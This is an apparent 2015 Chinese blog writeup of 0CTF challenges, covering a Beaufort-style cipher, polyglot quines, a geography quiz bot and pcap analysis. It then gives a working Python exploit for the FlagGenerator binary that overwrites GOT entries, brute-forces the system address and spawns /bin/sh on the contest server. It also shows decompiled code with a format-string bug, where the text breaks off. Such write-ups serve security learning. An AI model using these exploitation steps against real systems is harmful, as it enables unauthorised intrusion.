@@ -1,0 +1,816 @@
+
+<!DOCTYPE html>
+<html lang="en">
+    
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="generator" content="Eadom&#39;s Blog">
+    <title>0CTF2015 Writeup - Eadom&#39;s Blog</title>
+    <meta name="author" content="Eadom">
+    
+    
+        <link rel="icon" href="https://blog.eadom.net/assets/images/avatar.jpg">
+    
+    
+        <link rel="alternate" type="application/atom+xml" title="RSS" href="/atom.xml">
+    
+    <meta name="description" content="没怎么做alictf，做了0ctf。渣渣又被虐了……分享下writeup……
+oldcrypto
+Old crypto is not old enough to be broken. Notice: all in lowercase
+
+阅读这个是一个多表替换的密码，i两边是对称的，所以可以把i的变化去掉。这个有点类似维吉尼亚，不过代换是通过矩阵，而且是对称的。wiki下应该是 博福特密码。 解法跟">
+<meta property="og:type" content="blog">
+<meta property="og:title" content="0CTF2015 Writeup">
+<meta property="og:url" content="https://blog.eadom.net/writeups/0ctf-2015-writeup/index.html">
+<meta property="og:site_name" content="Eadom's Blog">
+<meta property="og:description" content="没怎么做alictf，做了0ctf。渣渣又被虐了……分享下writeup……
+oldcrypto
+Old crypto is not old enough to be broken. Notice: all in lowercase
+
+阅读这个是一个多表替换的密码，i两边是对称的，所以可以把i的变化去掉。这个有点类似维吉尼亚，不过代换是通过矩阵，而且是对称的。wiki下应该是 博福特密码。 解法跟">
+<meta property="og:image" content="http://yuf4n.net/wp-content/uploads/2015/03/peerliang.jpg">
+<meta property="og:updated_time" content="2019-03-15T09:11:12.481Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="0CTF2015 Writeup">
+<meta name="twitter:description" content="没怎么做alictf，做了0ctf。渣渣又被虐了……分享下writeup……
+oldcrypto
+Old crypto is not old enough to be broken. Notice: all in lowercase
+
+阅读这个是一个多表替换的密码，i两边是对称的，所以可以把i的变化去掉。这个有点类似维吉尼亚，不过代换是通过矩阵，而且是对称的。wiki下应该是 博福特密码。 解法跟">
+<meta name="twitter:image" content="http://yuf4n.net/wp-content/uploads/2015/03/peerliang.jpg">
+<meta name="twitter:creator" content="@Yufan_L">
+    
+    
+        
+    
+    
+        <meta property="og:image" content="https://blog.eadom.net/assets/images/avatar.jpg"/>
+    
+    
+    
+    
+    <!--STYLES-->
+    <link rel="stylesheet" href="/assets/css/style-yrst5vo1nxaxbp2g3v9na2wg1lixlpr3ghbjdvskeixmu79deycecx3rh4bt.min.css">
+    <!--STYLES END-->
+    
+    
+    <script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "//hm.baidu.com/hm.js?e2c34d89d7cd8c97b8b39f770eac6769";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+    </script>
+
+</head>
+
+    <body>
+        <div id="blog">
+            <!-- Define author's picture -->
+
+
+    
+        
+            
+        
+    
+
+<header id="header" data-behavior="1">
+    <i id="btn-open-sidebar" class="fa fa-lg fa-bars"></i>
+    <div class="header-title">
+        <a class="header-title-link" href="/ ">Eadom&#39;s Blog</a>
+    </div>
+    
+        
+            <a  class="header-right-picture "
+                href="#about">
+        
+        
+            <img class="header-picture" src="/assets/images/avatar.jpg" alt="Author&#39;s picture"/>
+        
+        </a>
+    
+</header>
+
+            <!-- Define author's picture -->
+
+
+
+        
+    
+
+<nav id="sidebar" data-behavior="1">
+    <div class="sidebar-container">
+        
+            <div class="sidebar-profile">
+                <a href="/#about">
+                    <img class="sidebar-profile-picture" src="/assets/images/avatar.jpg" alt="Author&#39;s picture"/>
+                </a>
+                <h4 class="sidebar-profile-name">Eadom</h4>
+                
+                    <h5 class="sidebar-profile-bio"><p>NO PWN NO FUN</p>
+</h5>
+                
+            </div>
+        
+        
+            <ul class="sidebar-buttons">
+            
+                <li class="sidebar-button">
+                    
+                        <a  class="sidebar-button-link "
+                             href="/ "
+                            
+                        >
+                    
+                        <i class="sidebar-button-icon fa fa-lg fa-home"></i>
+                        <span class="sidebar-button-desc">Home</span>
+                    </a>
+            </li>
+            
+                <li class="sidebar-button">
+                    
+                        <a  class="sidebar-button-link "
+                             href="/all-categories"
+                            
+                        >
+                    
+                        <i class="sidebar-button-icon fa fa-lg fa-bookmark"></i>
+                        <span class="sidebar-button-desc">Categories</span>
+                    </a>
+            </li>
+            
+                <li class="sidebar-button">
+                    
+                        <a  class="sidebar-button-link "
+                             href="/all-tags"
+                            
+                        >
+                    
+                        <i class="sidebar-button-icon fa fa-lg fa-tags"></i>
+                        <span class="sidebar-button-desc">Tags</span>
+                    </a>
+            </li>
+            
+                <li class="sidebar-button">
+                    
+                        <a  class="sidebar-button-link "
+                             href="/all-archives"
+                            
+                        >
+                    
+                        <i class="sidebar-button-icon fa fa-lg fa-archive"></i>
+                        <span class="sidebar-button-desc">Archives</span>
+                    </a>
+            </li>
+            
+                <li class="sidebar-button">
+                    
+                        <a  class="sidebar-button-link open-algolia-search"
+                             href="#search"
+                            
+                        >
+                    
+                        <i class="sidebar-button-icon fa fa-lg fa-search"></i>
+                        <span class="sidebar-button-desc">Search</span>
+                    </a>
+            </li>
+            
+                <li class="sidebar-button">
+                    
+                        <a  class="sidebar-button-link "
+                             href="#about"
+                            
+                        >
+                    
+                        <i class="sidebar-button-icon fa fa-lg fa-question"></i>
+                        <span class="sidebar-button-desc">About</span>
+                    </a>
+            </li>
+            
+        </ul>
+        
+            <ul class="sidebar-buttons">
+            
+                <li class="sidebar-button">
+                    
+                        <a  class="sidebar-button-link " href="https://github.com/eadom" target="_blank">
+                    
+                        <i class="sidebar-button-icon fa fa-lg fa-github"></i>
+                        <span class="sidebar-button-desc">GitHub</span>
+                    </a>
+            </li>
+            
+                <li class="sidebar-button">
+                    
+                        <a  class="sidebar-button-link " href="http://weibo.com/onetpig" target="_blank">
+                    
+                        <i class="sidebar-button-icon fa fa-lg fa-weibo"></i>
+                        <span class="sidebar-button-desc">Weibo</span>
+                    </a>
+            </li>
+            
+                <li class="sidebar-button">
+                    
+                        <a  class="sidebar-button-link " href="https://twitter.com/Yufan_L" target="_blank">
+                    
+                        <i class="sidebar-button-icon fa fa-lg fa-twitter"></i>
+                        <span class="sidebar-button-desc">Twitter</span>
+                    </a>
+            </li>
+            
+        </ul>
+        
+            <ul class="sidebar-buttons">
+            
+                <li class="sidebar-button">
+                    
+                        <a  class="sidebar-button-link "
+                             href="/atom.xml"
+                            
+                        >
+                    
+                        <i class="sidebar-button-icon fa fa-lg fa-rss"></i>
+                        <span class="sidebar-button-desc">RSS</span>
+                    </a>
+            </li>
+            
+        </ul>
+        
+    </div>
+</nav>
+
+            
+            <div id="main" data-behavior="1"
+                 class="
+                        hasCoverMetaIn
+                        ">
+                
+<article class="post" itemscope itemType="http://schema.org/BlogPosting">
+    
+    
+        <div class="post-header main-content-wrap text-left">
+    
+        <h1 class="post-title" itemprop="headline">
+            0CTF2015 Writeup
+        </h1>
+    
+    <div class="post-meta">
+    <time itemprop="datePublished" datetime="2015-04-02T23:59:51+08:00">
+	
+		    Apr 02, 2015
+    	
+    </time>
+    
+        <span>in </span>
+        
+    <a class="category-link" href="/categories/writeups/">writeups</a>
+
+
+    
+</div>
+
+</div>
+    
+    <div class="post-content markdown" itemprop="articleBody">
+        <div class="main-content-wrap">
+            <p>没怎么做alictf，做了0ctf。渣渣又被虐了……分享下writeup……</p>
+<h1 id="oldcrypto"><a href="#oldcrypto" class="headerlink" title="oldcrypto"></a>oldcrypto</h1><blockquote>
+<p>Old crypto is not old enough to be broken. Notice: all in lowercase</p>
+</blockquote>
+<p>阅读这个是一个多表替换的密码，i两边是对称的，所以可以把i的变化去掉。这个有点类似维吉尼亚，不过代换是通过矩阵，而且是对称的。wiki下应该是<strong> 博福特密码</strong>。 解法跟维吉尼亚密码一样，wiki说有<em>卡西斯基试验</em>或者<em>弗里德曼试验</em>，重复指数的代码找不到了就用的卡西斯基试验的方法<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">def search():</div><div class="line">i = 0</div><div class="line">with open(&apos;deletei&apos;) as f:</div><div class="line">cipher = f.read().strip()</div><div class="line">while i &lt; len(cipher):</div><div class="line">now = cipher[i:i+3]</div><div class="line">find = cipher[i+3:].find(cipher[i:i+3])</div><div class="line">if find != -1:</div><div class="line">print cipher[i:i+3], find+3</div><div class="line">i += 1</div></pre></td></tr></table></figure></p>
+<p>找出来发现很多很长的密文有重复且间隔都是20的倍数。所以猜测key是20位。 之后拆分成20组频率分析</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">def findk(src, des):</div><div class="line">for k in xrange(26):</div><div class="line">if tr[k][ord(des)-ord(&apos;a&apos;)] == ord(src)-ord(&apos;a&apos;):</div><div class="line">return chr(k + ord(&apos;a&apos;))</div><div class="line"></div><div class="line">def key():</div><div class="line">k = &apos;&apos;</div><div class="line">with open(&apos;split2&apos;) as f:</div><div class="line">for line in f:</div><div class="line">fre = &#123;&#125;</div><div class="line">line = line.strip()</div><div class="line">for c in line:</div><div class="line">if c in fre:</div><div class="line">fre[c] += 1</div><div class="line">else:</div><div class="line">fre[c] = 1</div><div class="line">sort_fre = sorted(fre.iteritems(),key=lambda fre:fre[1],reverse=True)</div><div class="line">k += findk(&apos;e&apos;, sort_fre[0][0])</div><div class="line">print k</div></pre></td></tr></table></figure>
+<p>都猜测出现最高的频率的是’e’，之后算出来的key = ‘wkaszhcslciyhwrusfun’。解出来发现不对，不过感觉但是最后fun应该是对的。之后通过查看解密的文章通过手工判断（文章最后是flag，而且用了20个o方便判断）解出key = ‘classicalcipherisfun’ flag:<strong>0ctf{classicalcipherisfun}</strong></p>
+<h1 id="BabyPolyQuine"><a href="#BabyPolyQuine" class="headerlink" title="BabyPolyQuine"></a>BabyPolyQuine</h1><blockquote>
+<p>Different people see different me. But I am always myself. 202.112.26.114:12321 Make the output of your program exactly the same as your source code. At least 3 correct to get this flag $python2 –version Python 2.7.6 $python3 –version Python 3.4.0 $gcc –version gcc (Ubuntu 4.8.2-19ubuntu1) 4.8.2 $ruby –version ruby 1.9.3p484 (2013-11-22 revision 43786) [x86_64-linux] $perl –version This is perl 5, version 18, subversion 2 (v5.18.2) built for x86_64-linux-gnu-thread-multi</p>
+</blockquote>
+<p>维基百科搜到一个代码通过<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">#include/*</div><div class="line">q=&apos;&apos;&apos;*/</div><div class="line">main()&#123;char*_;/*=;sub _:lvalue&#123;$_&#125;&lt;&lt;q;#&apos;;&lt;&lt;q#&apos;&apos;&apos;</div><div class="line">def printf(a,*b):print a%b,</div><div class="line">q</div><div class="line">#*/</div><div class="line">_=&quot; #include/*%cq=&apos;&apos;&apos;*/%cmain()&#123;char*_;/*=;sub _:lvalue&#123;%c_&#125;&lt;&lt;q;#&apos;;&lt;&lt;q#&apos;&apos;&apos;%cdef printf(a,*b):print a%%b,%cq%c#*/%c_=%c%s%c;printf(_,10,10,36,10,10,10,10,34,_,34,10,10,10,10);%c#/*%cq=&apos;&apos;&apos;*/%c&#125;//&apos;&apos;&apos;#=%c&quot;;printf(_,10,10,36,10,10,10,10,34,_,34,10,10,10,10);</div><div class="line">#/*</div><div class="line">q=&apos;&apos;&apos;*/</div><div class="line">&#125;//&apos;&apos;&apos;#=</div></pre></td></tr></table></figure></p>
+<p>flag:<strong>0ctf{The very moment of raising beginner’s mind is the accomplishment of true awakening itself}</strong></p>
+<h1 id="PolyQuine"><a href="#PolyQuine" class="headerlink" title="PolyQuine"></a>PolyQuine</h1><blockquote>
+<p>BabyPolyQuine 满足 All 5 correct required to get this flag</p>
+</blockquote>
+<p>上面的代码在python3会出问题，尝试加上括号，不过python3会多打一个空行。所以想办法利用不打空行的打印函数，想到stdout.write()于是<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">#include/*</div><div class="line">q=&apos;&apos;&apos;*/</div><div class="line">main()&#123;char*_;/*=;sub _:lvalue&#123;$_&#125;&lt;&lt;q;#&apos;;&lt;&lt;q#&apos;&apos;&apos;</div><div class="line">def printf(a,*b):__import__(&apos;sys&apos;).stdout.write(a%b)</div><div class="line">q</div><div class="line">#*/</div><div class="line">_=&quot; #include/*%cq=&apos;&apos;&apos;*/%cmain()&#123;char*_;/*=;sub _:lvalue&#123;%c_&#125;&lt;&lt;q;#&apos;;&lt;&lt;q#&apos;&apos;&apos;%cdef printf(a,*b):__import__(&apos;sys&apos;).stdout.write(a%%b)%cq%c#*/%c_=%c%s%c;printf(_,10,10,36,10,10,10,10,34,_,34,10,10,10,10);%c#/*%cq=&apos;&apos;&apos;*/%c&#125;//&apos;&apos;&apos;#=%c&quot;;printf(_,10,10,36,10,10,10,10,34,_,34,10,10,10,10);</div><div class="line">#/*</div><div class="line">q=&apos;&apos;&apos;*/</div><div class="line">&#125;//&apos;&apos;&apos;#=</div></pre></td></tr></table></figure></p>
+<p>flag:<strong>0ctf{“Yields falsehood when preceded by its quotation” yields falsehood when preceded by its quotation}</strong></p>
+<h1 id="x-y-z"><a href="#x-y-z" class="headerlink" title="x-y-z"></a>x-y-z</h1><blockquote>
+<p>-4.751373,-2.622809,2.428588;-4.435134,-3.046589,2.406030;-4.788052,-2.661979,2.464709 -4.692748,-2.599611,2.629112;-4.656070,-2.560445,2.592991;-4.788052,-2.661979,2.464709 -4.692748,-2.599611,2.629112;-4.788052,-2.661979,2.464709;-4.435134,-3.046589,2.406030 -4.656070,-2.560445,2.592991;-4.516017,-2.714652,2.570303;-4.751373,-2.622809,2.428588 -4.656070,-2.560445,2.592991;-4.751373,-2.622809,2.428588;-4.788052,-2.661979,2.464709 -4.611258,-2.777269,2.405960;-4.435134,-3.046589,2.406030;-4.751373,-2.622809,2.428588 -4.572725,-2.644557,2.333280;-4.603014,-2.680354,2.364417;-4.592222,-2.663824,2.351891 -4.571442,-2.773632,2.381504;-4.564917,-2.826000,2.397583;-4.611258,-2.777269,2.405960 ……</p>
+</blockquote>
+<p>感觉应该是坐标点，加上题目x-y-z。猜测把点全部描出来会不会看到立体的flag。。。于是matlab画散点图（电脑不好真惨，把点去掉一部分画还是卡）<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">A=[</div><div class="line">......</div><div class="line">];</div><div class="line">x=A(:,1);y=A(:,2);z=A(:,3);</div><div class="line">scatter3(x,y,z,&apos;.&apos;)</div></pre></td></tr></table></figure></p>
+<p>慢慢的旋转猜出flag</p>
+<h1 id="geo-newbie"><a href="#geo-newbie" class="headerlink" title="geo newbie"></a>geo newbie</h1><p>我的地理知识涨了不少</p>
+<blockquote>
+<p>Talentyange gives lots of tedious apks and you know how bad he is now. Let’s try some interesting geography knowledge. nc 202.112.26.111 29995 / nc 202.112.28.118 29995</p>
+</blockquote>
+<p>上去以后问你xxx是哪里的，用国家2字母简称表达。 前20轮给国家，21-70给地名，70-75问你河流或者山脉经过的国家。。。 前70用google map的geocoding api 后70轮用google+维基百科手动输入+自动缓存</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div></pre></td><td class="code"><pre><div class="line">from zio import *</div><div class="line">import re</div><div class="line">import requests</div><div class="line">import json</div><div class="line"></div><div class="line">correct = &#123;</div><div class="line">'Palestine, State of' : 'PS',</div><div class="line">'Norfolk Island':'NF',</div><div class="line">'Alexandria':'EG',</div><div class="line">'Antarctica':'AQ',</div><div class="line">'Micronesia':'FM',</div><div class="line">'Naples':'IT',</div><div class="line">'Mount Olympus':'GR',</div><div class="line">'Hyde Park':'GB',</div><div class="line">'Georgia':'GE',</div><div class="line">'Micronesia (Federated States of)':'FM',</div><div class="line">'Korea (Republic of)':'KR',</div><div class="line">'Holy See':'VA',</div><div class="line">'Tanzania, United Republic of':'TZ',</div><div class="line">'Macedonia (the former Yugoslav Republic of)':'MK',</div><div class="line">'Volga':'RU',</div><div class="line">'Lego':'DK',</div><div class="line">'Virgin Islands (British)':'VG',</div><div class="line">'Rickshaw capital of the world':'BD',</div><div class="line">'Melbourne':'AU',</div><div class="line">'Vancouver':'CA',</div><div class="line">'Korea (Democratic People's Republic of)':'KP',</div><div class="line">'Jiuzhaigou Valley':'CN',</div><div class="line">'Georgia':'GE',</div><div class="line">&#125;</div><div class="line"></div><div class="line">target = (('202.112.28.118',29995))</div><div class="line"></div><div class="line">def geo(query):</div><div class="line">url = 'http://maps.googleapis.com/maps/api/geocode/json?address=%s&amp;sensor=true_or_false' % query</div><div class="line">r = requests.get(url)</div><div class="line">result = json.loads(r.text)</div><div class="line"># print result</div><div class="line">for com in result['results'][0]['address_components']:</div><div class="line">if "country" in com['types']:</div><div class="line">return com['short_name']</div><div class="line"></div><div class="line">io = zio(target, timeout=100000,</div><div class="line">print_read=COLORED(REPR,'red'),</div><div class="line">print_write=COLORED(REPR,'green')</div><div class="line">)</div><div class="line"></div><div class="line"># level 1</div><div class="line">for i in range(70):</div><div class="line">buf = io.read_until(':')</div><div class="line">country_name = re.findall(r'n(.+)?:', buf)[0]</div><div class="line"># print country_name</div><div class="line"># country = pycountry.countries.get(name=country_name)</div><div class="line"># io.writeline(country_ascii2_dict[country_name])</div><div class="line">if country_name in correct:</div><div class="line">io.writeline(correct[country_name])</div><div class="line">else:</div><div class="line">io.writeline(geo(country_name))</div><div class="line"></div><div class="line"># load</div><div class="line">level2 = &#123;&#125;</div><div class="line">with open('level2') as f:</div><div class="line">level2 = json.loads(f.read())</div><div class="line"></div><div class="line">buf = io.read_until(':')</div><div class="line"># level 2</div><div class="line">try:</div><div class="line">for i in range(30):</div><div class="line">question = re.findall(r'n(.+)?:', buf)[0]</div><div class="line">if question in level2:</div><div class="line">ans = level2[question]</div><div class="line">else:</div><div class="line">ans = raw_input()</div><div class="line">ans = ans.strip().split(',')</div><div class="line">for c in ans:</div><div class="line">if c in correct:</div><div class="line">io.writeline(correct[c])</div><div class="line">else:</div><div class="line">io.writeline(geo(c))</div><div class="line">buf = io.read_until(':')</div><div class="line">level2[question] = ans</div><div class="line">except Exception, e:</div><div class="line">with open('level2','w') as f:</div><div class="line">f.write(json.dumps(level2))</div><div class="line">print e</div><div class="line">exit()</div><div class="line"></div><div class="line">with open('level2','w') as f:</div><div class="line">f.write(json.dumps(level2))</div><div class="line"></div><div class="line">io.interact()</div></pre></td></tr></table></figure>
+<p>flag:<strong>0CTF{eNj0y_geography_l0v3_7hE_w0lRd}</strong></p>
+<h1 id="peers"><a href="#peers" class="headerlink" title="peers"></a>peers</h1><blockquote>
+<p>peers :P 一个pcap文件</p>
+</blockquote>
+<p>打开发现是bt传输文件的流量。搜索下发现与<a href="http://eindbazen.net/2012/05/plaid-ctf-2012-torrent/" target="_blank" rel="external">Plaid CTF 2012 – Torrent</a>类似。 不过有个坑，就是用到80端口，wireshark把它认成了HTTP请求，影响了服务解析。只要把enable service里HTTP给去掉就好了。</p>
+<blockquote>
+<p>PS. 朋友圈看到有人把那个分片的传输数据剪出来拼起来了。给各位大神跪了。。。  <a href="http://yuf4n.net/wp-content/uploads/2015/03/peerliang.jpg" target="_blank" rel="external"><img src="http://yuf4n.net/wp-content/uploads/2015/03/peerliang.jpg" alt="peerliang"></a></p>
+</blockquote>
+<h1 id="FlagGenerator"><a href="#FlagGenerator" class="headerlink" title="FlagGenerator"></a>FlagGenerator</h1><blockquote>
+<p>Can you generate the correct flag? flagen libc.so.6 202.112.26.106:5149 202.112.28.115:5149 Notice: Ubuntu 14.04.2 LTS</p>
+</blockquote>
+<h2 id="漏洞发现"><a href="#漏洞发现" class="headerlink" title="漏洞发现"></a>漏洞发现</h2><pre><code>RELRO STACK CANARY NX PIE RPATH RUNPATH FILE
+Partial RELRO Canary found NX enabled No PIE No RPATH No RUNPATH flagen
+</code></pre><p>这个是个花式flag生成器。问题出再fun4，把字符转成数字例如把’a’转成’4’，就比如yufan变成yuf4n(其实是用户名已注册…)。其中把h变化为’1-1’。一个字符变3个字符就栈溢出了。。。</p>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>利用那个扩展在输入里填一些hhh就能造成溢出。就是有个canary。</p>
+<pre><code>strcpy(dest, &amp;src);
+return *MK_FP(__GS__, 20) ^ v18;
+</code></pre><p>注意在之后有一个从栈里src考数据到分配的对指针dest的调用。dest是函数传进来的，栈溢出的时候可以改到。 利用步骤</p>
+<ol>
+<li>利用那个strcpy将GOT中check_stack_fail函数地址改掉绕过stack smash check，顺带将system地址覆盖GOT中atoi。(简单粗暴地爆破system地址)</li>
+<li>栈溢出将eip控制到sub_804873E，直接利用atoi调用system(‘/bin/sh’)获得shell</li>
+</ol>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> zio <span class="keyword">import</span> *</div><div class="line"><span class="keyword">import</span> struct</div><div class="line"></div><div class="line">checkfail_got = <span class="number">0x0804B01C</span></div><div class="line">brute_system = <span class="number">0xf75de190</span></div><div class="line"></div><div class="line"><span class="comment"># target = ('./flagen')</span></div><div class="line">target = ((<span class="string">'202.112.28.115'</span>, <span class="number">5149</span>))</div><div class="line"></div><div class="line">copyto = <span class="string">''</span></div><div class="line">copyto += l32(brute_system)*<span class="number">10</span></div><div class="line"></div><div class="line">p = <span class="string">''</span></div><div class="line">p += l32(ret)</div><div class="line">p += copyto</div><div class="line">p += <span class="string">'a'</span>*(<span class="number">48</span> -len(copyto)<span class="number">-4</span>)</div><div class="line">p += <span class="string">'h'</span> * <span class="number">40</span> + <span class="string">'a'</span>*<span class="number">100</span></div><div class="line"></div><div class="line">p += l32(checkfail_got + <span class="number">4</span>) <span class="comment">#ebp</span></div><div class="line">p += l32(<span class="number">0x804873E</span>) <span class="comment"># eip</span></div><div class="line">p += l32(checkfail_got) <span class="comment"># dest</span></div><div class="line"></div><div class="line">cnt = <span class="number">0</span></div><div class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</div><div class="line"><span class="keyword">print</span> cnt</div><div class="line">cnt += <span class="number">1</span></div><div class="line">io = zio(target, timeout=<span class="number">100000</span>,</div><div class="line">print_read=COLORED(REPR,<span class="string">'red'</span>),</div><div class="line">print_write=COLORED(REPR,<span class="string">'green'</span>)</div><div class="line">)</div><div class="line">io.writeline(<span class="string">'1'</span>)</div><div class="line">io.writeline(p)</div><div class="line"><span class="comment"># io.gdb_hint()</span></div><div class="line">io.writeline(<span class="string">'4'</span>)</div><div class="line">io.writeline(<span class="string">'/bin/sh'</span>)</div><div class="line">io.interact()</div></pre></td></tr></table></figure>
+<p>flag:<strong>0ctf{delicious_stack_cookie_generates_flag}</strong></p>
+<h1 id="login"><a href="#login" class="headerlink" title="login"></a>login</h1><blockquote>
+<p>Login as guest. Logout as root. libc.so.6 202.112.26.107:10910 202.112.28.116:10910</p>
+</blockquote>
+<p>&gt;</p>
+<blockquote>
+<p>Notice: Ubuntu 14.04.2 LTS The process is protected by a sandbox. So you may not get a shell. The only thing you can do is reading the “flag”. If you want to break the sandbox, turn to task “0ops APP”.</p>
+</blockquote>
+<h2 id="漏洞发现-1"><a href="#漏洞发现-1" class="headerlink" title="漏洞发现"></a>漏洞发现</h2><pre><code>RELRO STACK CANARY NX PIE RPATH RUNPATH FILE
+Full RELRO Canary found NX enabled PIE enabled No RPATH No RUNPATH login
+</code></pre><p>利用guest，guest123登陆。用户名用一个全局buffer存储，最后一位有个标志为初始设置成0。 之后可以通过fun2修改用户，而且可以修改到标志位。 然后可以用fun4<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div></pre></td><td class="code"><pre><div class="line">void __noreturn fun4_sub_103B()</div><div class="line">&#123;</div><div class="line">__int64 v0; // rax@1</div><div class="line">__int64 strpt; // rsi@1</div><div class="line">__int64 v2; // rax@4</div><div class="line">__int64 v3; // rsi@4</div><div class="line">char v4; // [sp+0h] [bp-220h]@1</div><div class="line">char czUser; // [sp+10h] [bp-210h]@1</div><div class="line">char czPassword; // [sp+110h] [bp-110h]@1</div><div class="line">__int64 v7; // [sp+218h] [bp-8h]@1</div><div class="line"></div><div class="line">v7 = *MK_FP(__FS__, 40LL);</div><div class="line">printf(&quot;Login: &quot;);</div><div class="line">safe_read_sub_CB5((__int64)&amp;czUser, 256);</div><div class="line">printf(&quot;Password: &quot;, 256LL);</div><div class="line">safe_read_sub_CB5((__int64)&amp;czPassword, 256);</div><div class="line">v0 = strlen(&amp;czPassword);</div><div class="line">MD5((__int64)&amp;czPassword, v0, (__int64)&amp;v4);</div><div class="line">strpt = (__int64)&quot;root&quot;;</div><div class="line">if ( !strcmp(&amp;czUser, &quot;root&quot;) )</div><div class="line">&#123;</div><div class="line">strpt = (__int64)&quot;0ops&#123;secret_MD5&#125;&quot;;</div><div class="line">if ( !memcmp(&amp;v4, &quot;0ops&#123;secret_MD5&#125;&quot;, 16uLL) )</div><div class="line">showflag_sub_FB3();</div><div class="line">&#125;</div><div class="line">printf(&amp;czUser, strpt); // formatstring attack</div><div class="line">puts(&quot; login failed.&quot;);</div><div class="line">puts(&quot;1 chance remaining.&quot;);</div><div class="line">printf(&quot;Login: &quot;);</div><div class="line">safe_read_sub_CB5((__int64)&amp;czUser, 256);</div><div class="line">printf(&quot;Password: &quot;, 256LL);</div><div class="line">safe_read_sub_CB5((__int64)&amp;czPassword, 256);</div><div class="line">v2 = strlen(&amp;czPassword);</div><div class="line">MD5((__int64)&amp;czPassword, v2, (__int64)&amp;v4);</div><div class="line">v3 = (__int64)&quot;root&quot;;</div><div class="line">if ( !strcmp(&amp;czUser, &quot;root&quot;) )</div><div class="line">&#123;</div><div class="line">v3 